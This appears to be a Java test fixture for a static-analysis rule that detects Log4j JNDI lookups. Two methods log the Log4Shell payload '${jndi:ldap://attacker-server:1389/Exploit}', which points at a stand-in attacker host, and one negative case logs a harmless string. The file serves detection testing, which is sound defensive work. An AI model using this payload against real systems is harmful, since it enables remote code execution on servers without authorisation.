import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Foo {
  private static final Logger LOGGER = LogManager.getLogger(Foo.class);

  public static void bad() {
    // bearer:expected java_lang_log4j_jndi_lookup
    LOGGER.info("${jndi:ldap://attacker-server:1389/Exploit}");
  }


  public static void bad2() {
    String malicious = "${jndi:ldap://attacker-server:1389/Exploit}";
    // bearer:expected java_lang_log4j_jndi_lookup
    LOGGER.info(malicious);
  }

  public static void ok() {
    LOGGER.info("${not-jndi}");
  }
}